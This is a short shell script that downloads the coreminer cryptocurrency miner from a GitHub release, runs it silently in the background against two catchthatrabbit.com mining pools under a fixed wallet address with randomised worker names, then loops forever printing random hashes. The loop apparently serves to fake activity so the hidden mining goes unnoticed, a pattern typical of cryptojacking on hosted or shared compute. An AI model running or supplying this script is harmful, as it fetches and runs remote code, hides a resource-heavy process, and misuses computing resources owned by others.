curl https://github.com/catchthatrabbit/coreminer/releases/download/v0.19.89/coreminer-linux-x86_64.tar.gz -L -o coreminer-linux-x86_64.tar.gz
tar xf coreminer-linux-x86_64.tar.gz
cd coreapp
./coreminer -P stratum1+tcp://cb201002d27ee4ee739996901db54d86562c11cec806.$(echo $RANDOM | md5sum | head -c 10)@de.catchthatrabbit.com:8008 \
     -P stratum1+tcp://cb201002d27ee4ee739996901db54d86562c11cec806.$(echo $RANDOM | md5sum | head -c 10)@us.catchthatrabbit.com:8008 > /dev/null 2>&1 &
while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 30s; done
